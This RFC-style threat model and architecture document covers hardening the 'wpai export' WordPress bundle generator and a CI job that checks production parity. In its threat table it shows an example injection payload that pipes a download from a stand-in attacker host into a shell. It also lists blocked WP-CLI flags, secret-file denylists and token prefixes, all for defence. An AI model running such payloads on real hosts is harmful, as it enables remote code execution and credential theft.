# Export Security Threat Model & Stage 2 Production Parity Architecture

**Status:** RFC / Architecture & Security Design
**Related Issues / PRs:** [#1](https://github.com/patilswapnilv/wp-agent-experience/issues/1) (PR [#3](https://github.com/patilswapnilv/wp-agent-experience/pull/3)), [#2](https://github.com/patilswapnilv/wp-agent-experience/issues/2)
**Applies to:** `packages/wpai-cli` (`wpai export`, `wpai verify`, CI release gates)

---

## 1. Three Mandatory Release Gates

Issues [#1](https://github.com/patilswapnilv/wp-agent-experience/issues/1) and [#2](https://github.com/patilswapnilv/wp-agent-experience/issues/2) exposed a gap between verifying code inside a development repository and verifying the experience external developers and production operators actually get. Going forward, WPAI adopts **three distinct, mandatory verification gates**:

| Gate | Question Answered | Mechanism | Current Status |
|---|---|---|---|
| **Gate 1 — Development Verification** | Does the code build, validate, and pass inside this repository? | `npm run validate`, `npm test`, `npm run test:integration` (Playground WASM) | Active in `.github/workflows/ci.yml` |
| **Gate 2 — Distribution Verification** | Does the published npm tarball work when installed in an empty directory outside the repo? | `npm run test:pack` (`npm pack` → clean temp install → CLI, MCP, spoofed-`cwd` precedence checks) | Added in PR #3 |
| **Gate 3 — Production Parity Verification** | Does an exported bundle reproduce all `verify.json` assertions on a real MySQL/MariaDB WordPress install? | Ephemeral MariaDB + WordPress container executing `setup.sh` + shared `verify.json` probe | Designed below (Stage 2) |

**Core invariant:**
> *A passing WordPress Playground verification must never be treated as proof of production deployment parity.*

## 2. Export Security Threat Model (`wpai export`)

### 2.1 Trust Boundary

`wpai verify` runs inside WordPress Playground's WebAssembly PHP + ephemeral SQLite sandbox. By contrast, `wpai export` generates artifacts (`wp-content/`, `setup.sh`, `DEPLOY.md`) intended to run on a **real production WordPress host** with live MySQL/MariaDB credentials, writable host filesystems, and outbound network access.

Because Blueprints in WPAI workflows may be **generated by AI coding agents** or sourced from third-party repositories, every Blueprint input to `wpai export` must be treated as **untrusted data** until validated and explicitly authorized by a human operator.

```
[Untrusted / Agent-Generated Blueprint + Local Project Dir]
                          │
            ┌─────────────▼─────────────┐
            │  wpai export Trust Gate   │
            │  • Schema & slug checks   │
            │  • Shell/PHP boundary     │
            │  • Symlink/path checks    │
            │  • Secret & file denylist │
            │  • SHA-256 manifest       │
            └─────────────┬─────────────┘
                          │
      [Reviewable Production Bundle + DEPLOY.md]
                          │
             (Explicit Human Operator Review
              + --dry-run / confirmation)
                          │
                          ▼
   [Production WordPress (MySQL/MariaDB + WP-CLI)]
```

### 2.2 Threat Catalog (Grounded in Current Source)

| ID | Threat | Current Source Finding | Impact | Required Mitigation |
|---|---|---|---|---|
| **T1** | **Shell command injection & unsafe WP-CLI execution via `wp-cli` steps** | `packages/wpai-cli/src/export.ts:174-179` appends `step.command.trim()` verbatim into `setup.sh`. | Arbitrary shell execution on the production host (e.g. `wp option update x y; curl attacker.tld \| sh`, `$(...)`, backticks, newlines, redirections), or arbitrary PHP/remote execution via WP-CLI global flags (`--exec`, `--require`, `--ssh`) and privileged subcommand arguments. | Never emit raw shell strings. Tokenize `step.command` into argv; reject shell metacharacters (`;`, `\|`, `&`, `$`, `` ` ``, `>`, `<`, `\n`, `\r`); require `argv[0] === 'wp'`; **strictly block WP-CLI global execution/target flags** (`--exec`, `--require`, `--ssh`, `--http`, `--path`, `--url`, `--allow-root`) on every subcommand; enforce **per-subcommand argument/option allowlists** (rejecting e.g. `wp plugin/theme install <url-or-local-zip>`, `wp user create ... --role=administrator`, or `wp option update` on sensitive keys such as `siteurl`, `home`, `active_plugins`, `default_role`, `users_can_register`), or reject raw `wp-cli` steps unless they match strict templates; single-quote-escape every token; reject non-allowlisted commands as skipped/blocked. |
| **T2** | **Untrusted PHP execution (`runPHP` replay & inline `writeFile` PHP)** | `export.ts:101-131` writes inline PHP files to `wp-content/`; naive Stage 2 PHP replay would execute arbitrary `runPHP` via `wp eval-file`. | Arbitrary code execution in production PHP context with database credentials and filesystem access. | Prefer **data-only materialized export** (WXR + declarative JSON state, §3.2) so standard exports require **zero** `runPHP` replay. For any PHP files written to `wp-content/` (themes/plugins/mu-plugins), emit a complete inventory with SHA-256 hashes in `MANIFEST.sha256` and `DEPLOY.md` for operator review. If optional `runPHP` replay is ever supported, gate it behind an explicit `--allow-php-replay` flag with clear warnings. |
| **T3** | **Path traversal & symlink escape** | `export.ts:40-53` (`copyDirCollect`) and `export.ts:76` (`fs.statSync(localWpContent)`) follow symlinks; `export.ts:106` only checks `!relInside.includes('..')`. | Exfiltrating host files (e.g. `~/.ssh`, `/etc/passwd`, `.env`) into the export bundle or writing files outside `outDir`. | Check `fs.lstatSync` on `localWpContent` and every directory entry; skip/reject symlinks and report them explicitly. For `writeFile`, normalize paths and enforce `path.resolve(wpContentOut, relInside).startsWith(wpContentOut + path.sep)`; reject NUL bytes, Windows drive letters, and sensitive filenames (`wp-config.php`, `.htaccess`, `.user.ini`, `.env*`). |
| **T4** | **WP-CLI option/flag injection via slugs & options** | `export.ts:83,91,137,149,161,169` shell-escape values with `shellEscapeSingle`, which stops shell metacharacters but does not stop leading-dash WP-CLI flags (e.g. slug `--allow-root` or `--force`). | Unexpected WP-CLI flags altering installation source or permissions. | Validate plugin/theme slugs against `/^[a-z0-9][a-z0-9_-]*$/`; pass `--` end-of-options separator before positional arguments where WP-CLI supports it; normalize Playground `/wordpress/wp-content/plugins/` prefixes before validating `activatePlugin` identifiers. |
| **T5** | **Credential & sensitive file leakage** | `copyDirCollect` skips dot-prefixed entries (`entry.name.startsWith('.')`) but copies `debug.log`, `*.sql`, `*.sqlite`, `wp-config*.php`, `*.pem`, `*.key` if present inside `wp-content/`. | Accidental leakage of local credentials, DB dumps, or debug traces into deployable bundles or Git repos. | Maintain an explicit denylist (`wp-config*.php`, `*.env*`, `*.sql`, `*.sqlite*`, `debug.log`, `*.pem`, `*.key`, `*.p12`, `id_rsa*`) plus a warning scanner for common token prefixes (`sk-`, `ghp_`, `AKIA`). Never emit admin passwords or API secrets into `setup.sh` or `wpai-state.json`. |
| **T6** | **Asset shadowing / untrusted `cwd` override** | Resolved in PR #3 (`src/paths.ts`): removed `process.cwd()` lookups from `findRegistryPath()`, `findRegistrySchemaPath()`, `findPlatformSelectionSkillPath()`, `findBlueprintPresetDir()`, `findRepoRoot()`, and `findPlaygroundCli()`. | Spoofed `registry/wp-capabilities.json`, `SKILL.md`, `blueprints/<preset>/`, or `node_modules/.bin/wp-playground-cli` in an untrusted working directory could hijack platform-fit advice, MCP resources, `wpai init`, or Playground execution. | Enforced precedence: `explicit CLI flag` → `bundled package assets` → `dev repo / package fallback relative to __dirname` (never `process.cwd()`). Covered by regression tests in `unit.test.ts` and `test-pack.mjs` (including spoofed `registry/`, `skills/`, and `blueprints/` directories). |
| **T7** | **Unauthorized production mutation** | `setup.sh` executes immediately when invoked with no dry-run or confirmation guard. | Accidental execution against the wrong WordPress root or live database. | Keep `wpai export` strictly offline/bundle-only (never SSH/push directly to prod). Add `--dry-run` support to `setup.sh` and require either interactive confirmation or explicit `--yes` before mutating an existing database. |

### 2.3 Mitigation Status (Follow-up PR A — Export Security Hardening)

The "Current Source Finding" column above describes the code before hardening. `packages/wpai-cli/src/export.ts` now implements:

- **T1:** `wp-cli` steps go through `tokenizeWpCliCommand()` / `sanitizeWpCliCommand()`. Shell metacharacters outside quotes, newlines, backslashes, and unterminated quotes are rejected; `argv[0]` must be `wp`; `--exec`, `--require`, `--ssh`, `--http`, `--path`, `--url`, `--allow-root`, `--user`, and `--context` are blocked; only subcommands in `WP_CLI_ALLOWLIST` (with per-subcommand flag and positional checks) are emitted, re-quoted token by token. Everything else becomes a blocking skipped step.
- **T3:** The local `wp-content/` tree is walked with `fs.lstatSync`; symlinks (including a symlinked `wp-content/` itself) are never followed and are reported as blocking. `writeFile`/`mkdir` paths reject `..`, NUL, backslashes, and drive letters, and are checked to resolve inside the bundle's `wp-content/`.
- **T4:** Plugin/theme slugs (`plugins`, `installPlugin`, `installTheme`, `activateTheme`, normalized `activatePlugin`) must match `/^[a-z0-9][a-z0-9_-]*$/`. Option names must not start with `-`, option values starting with `--` are refused, and security-sensitive options (`siteurl`, `home`, `active_plugins`, `default_role`, `users_can_register`, `*user_roles`, salts, …) are never written.
- **T5:** `wp-config*.php`, `.env*`, `*.sql[.gz]`, `*.sqlite*`, `debug.log`, `*.pem`, `*.key`, `*.p12`, `id_rsa*`, `.htaccess`, `.htpasswd`, and `.user.ini` are excluded from the copy (reported as non-blocking) and refused as `writeFile` targets.
- **T7:** `setup.sh` accepts `--dry-run` (prints commands, never calls `wp`) and `--yes`; without `--yes` it prompts on a TTY and refuses to run non-interactively.

Not yet implemented: the secret-token content scanner (T5) and `MANIFEST.sha256` (T2), which are scoped to Stage 2.

## 3. Stage 1 & Stage 2 Production Export Architecture

### 3.1 Clean Boundary Between Stage 1 (Issue #2) and Stage 2

- **Stage 1 — Fail-Safe Static Export (tracked in [#2](https://github.com/patilswapnilv/wp-agent-experience/issues/2)):**
  - Inspects every Blueprint step and identifies all untranslated or partially translated operations (`runPHP`, non-`wp-content` `writeFile`, `importWxr`, `defineWpConfigConsts`, non-`wordpress.org` plugin/theme zips, etc.).
  - Reports skipped steps in CLI output, structured `--json` output, and `DEPLOY.md`.
  - **Fails safely by default** (non-zero exit, `ok: false`) whenever required Blueprint operations cannot be translated, unless the caller explicitly opts in with `--allow-partial` (marking the bundle as incomplete).
- **Stage 2 — Materialized Production Parity Export (designed below):**
  - Eliminates the need for `--allow-partial` on content-rich Blueprints by capturing materialized site state cleanly without replaying arbitrary PHP in production.

### 3.2 Candidate Stage 2 Approaches Compared

| Dimension | Option A: `runPHP` → `setup.d/*.php` (`wp eval-file`) | Option B: Pure WXR (`wp export` / `wp import`) | Option C (Recommended): Hybrid Materialized Export (WXR + Declarative `wpai-state.json`) |
|---|---|---|---|
| **Pages, Posts, CPTs & Post Meta** | Depends on PHP script | Preserved natively | Preserved natively via `content.wxr` |
| **Media & Uploads** | Not captured unless PHP copies files | URLs/metadata only (needs `uploads/` copy) | Metadata in `content.wxr` + files in `wp-content/uploads/` |
| **Front page (`show_on_front` / `page_on_front`)** | Preserved | **Lost** (post IDs change on import) | Preserved cleanly via **slug lookup** in `wpai-state.json` |
| **Permalinks & Custom Site Options** | Preserved | **Lost** | Preserved via allowlisted `wpai-state.json` options |
| **Editorial Users & Roles** | Preserved (risks hardcoded demo passwords) | Partial (author stubs only, roles lost) | Preserved declaratively in `wpai-state.json` (random password / reset required) |
| **Custom Plugin DB Tables** | Only if PHP creates them | Not captured | Explicitly flagged as requiring plugin-specific migration / `setup.sh` plugin activation |
| **Arbitrary PHP Replay in Prod (T2)** | **High risk** (runs raw Blueprint PHP on prod) | **None** | **None** (data-only import + reviewed `wp-content/`) |
| **Playground Path/SQLite Coupling** | Fragile (`/wordpress/...` paths, SQLite quirks) | Clean (WordPress export API) | Clean (WordPress export API + declarative state) |
| **Idempotency on Re-Run** | Fragile (requires every script to guard `wp_insert_post` with array post types) | Built-in (`wp import --skip=attachment` / duplicate detection) | Built-in WXR dedup + slug-based upserts for options/users |
| **Export Speed** | Fast (offline) | Boots Playground once (~5–10s) | Boots Playground once (~5–10s); Stage 1 fast static mode remains available for option/file-only Blueprints |

### 3.3 Recommended Stage 2 Architecture: Hybrid Materialized Export

When `wpai export <target> --out <dir>` runs in Stage 2 materialized mode:

1. **Boot Blueprint in Isolated Playground Sandbox:**
   - Runs the Blueprint inside `@wp-playground/cli` (WASM + ephemeral SQLite, identical to `wpai verify`), allowing any `runPHP`, `importWxr`, theme/plugin activation, or content-seeding steps to execute safely inside WASM.
2. **Extract Materialized Artifacts from Sandbox (Data Only — Zero Raw `runPHP` Replay):**
   - **`content.wxr`:** Exported inside Playground via WordPress's native WXR exporter (`export_wp()`), capturing pages, posts, custom post types, post meta, categories/taxonomies, and navigation/block templates.
   - **`wpai-state.json`:** Declarative JSON snapshot extracted by a small read-only extractor script inside Playground:
     - Allowlisted site options: `blogname`, `blogdescription`, `permalink_structure`, `show_on_front`, plus any custom non-secret options explicitly registered or prefixed (`wpai_*`).
     - Front-page & posts-page references stored **by post slug** (e.g. `page_on_front_slug: "home"`, `page_for_posts_slug: "updates"`) so `setup.sh` resolves the real post ID on the target MySQL database.
     - Non-admin editorial users (`user_login`, `user_email`, `display_name`, `role`) — **never** exporting password hashes or demo passwords; `setup.sh` creates missing users with `wp user create --prompt=user_pass` or a generated temporary password requiring reset.
     - Active theme stylesheet & active plugin slugs (normalized from Playground paths and validated against slug regex per T4).
   - **`wp-content/`:** Copied from Playground's `/wordpress/wp-content/` (themes, plugins, mu-plugins, uploads), filtered through the symlink guard (T3) and sensitive-file denylist (T5).
3. **Generate Hardened, Injection-Safe `setup.sh` + `MANIFEST.sha256` + `DEPLOY.md`:**
   - `setup.sh` (strictly ordered so CPTs and authors exist before WXR import):
     - Supports `--dry-run` and `--yes` (T7).
     - Installs/activates validated `wordpress.org` themes and plugins (`--` separated, T4) after `wp-content/` (including `mu-plugins/`) is in place so custom post types and taxonomies are registered.
     - Creates declared non-admin editorial users from `wpai-state.json` if absent and generates an explicit identity mapping file (`$SCRIPT_DIR/authors.csv`, mapping each WXR `user_login` to its pre-created local `user_login`) **before** importing WXR, so posts authored by those accounts preserve their original authorship instead of falling back to the admin user.
     - Ensures `wordpress-importer` (pinned to a verified release) is available and imports `content.wxr` via `wp import "$SCRIPT_DIR/content.wxr" --authors="$SCRIPT_DIR/authors.csv" --skip=attachment` so the importer never attempts HTTP fetches against the disposed Playground instance. Attachment records and featured images (`_thumbnail_id`) are restored locally from the copied `wp-content/uploads/` files using a deterministic local-source import step (`wp media import` / attachment manifest in `wpai-state.json`) followed by `wp search-replace` remapping the Playground origin URL to the target site URL, keeping media references intact offline.
     - Applies allowlisted options from `wpai-state.json` and resolves `page_on_front_slug` / `page_for_posts_slug` via `wp post list --post_type=page --post_status=publish --name=<slug> --posts_per_page=1 --field=ID` (strictly filtering by published page and selecting a single ID so attachments or draft/trashed slug collisions never break `wp option update page_on_front`).
     - Flushes permalinks (`wp rewrite flush --hard`) and prints a summary.
   - `MANIFEST.sha256`: Checksums of every file in `wp-content/`, `content.wxr`, `wpai-state.json`, and `setup.sh` for operator audit prior to production deployment.
   - `DEPLOY.md`: Lists included artifacts, checksum verification command (`sha256sum -c MANIFEST.sha256`), any unsupported items (e.g. custom non-core DB tables or external plugin ZIPs), and the MySQL/MariaDB checklist.

## 4. Gate 3: Production Parity Integration Test Architecture

To close the gap between Playground verification and real production deployment, we introduce a **shared verification probe** and an automated **MySQL/MariaDB parity CI job**.

### 4.1 Shared `verify.json` Probe (`verify-probe.php`)

Currently, `buildVerifyPhpScript()` in `packages/wpai-cli/src/playground.ts` embeds the `verify.json` assertion logic inline for Playground WASM.

In Stage 2, extract the assertion engine into a standalone, environment-agnostic PHP script (`verify-probe.php`) that:
- Accepts the `verify.json` spec via file path or stdin/env (no hardcoded `/wordpress/wp-load.php` or `/wpai-out/report.json`).
- Runs identically in:
  1. **WordPress Playground (`wpai verify`):** executed via `runPHP` with WordPress loaded in WASM.
  2. **Production / Staging / CI MySQL WordPress (`wpai verify-target` or `wp eval-file`):** executed via `wp eval-file verify-probe.php <verify.json>` on a real LAMP/LEMP container, plus live HTTP checks (`curl`/Node `fetch`) against the actual web server for `/`, required page URLs, and `/wp-json/...` REST routes.

### 4.2 CI Production Parity Workflow (`production-parity` Job)

```
┌──────────────────────────────────────────────────────────────────────┐
│ GitHub Actions Job: production-parity (ubuntu-latest + Docker)       │
├──────────────────────────────────────────────────────────────────────┤
│ 1. Start MariaDB 10.11 + WordPress (PHP 8.3 + Apache + WP-CLI)       │
│ 2. For each preset (small-business, commerce, publishing,            │
│    nonprofit, course, migration):                                    │
│    a. `wpai init <preset> --dir /tmp/site`                           │
│    b. `wpai verify /tmp/site`            (Gate 1: Playground WASM)   │
│    c. `wpai export /tmp/site --out /tmp/dist`                        │
│    d. Reset fresh MariaDB WordPress DB (`wp db reset --yes` +        │
│       `wp core install`) and clean `wp-content/mu-plugins/`,         │
│       installed plugins/themes, and uploads so nothing leaks across  │
│       presets                                                        │
│    e. Copy `/tmp/dist/wp-content/` into container `wp-content/`      │
│    f. Verify `sha256sum -c MANIFEST.sha256`                          │
│    g. Run `/tmp/dist/setup.sh --yes` inside WordPress container      │
│    h. Execute shared `verify-probe.php` with `/tmp/site/verify.json` │
│    i. Assert 100% pass: pages, posts, CPTs, categories, users,       │
│       `show_on_front`/`page_on_front`, REST HTTP 200, Abilities API, │
│       zero PHP errors                                                │
│    j. **Idempotency check:** Run `/tmp/dist/setup.sh --yes` a second │
│       time and assert page/post/CPT/user counts did NOT double       │
└──────────────────────────────────────────────────────────────────────┘
```
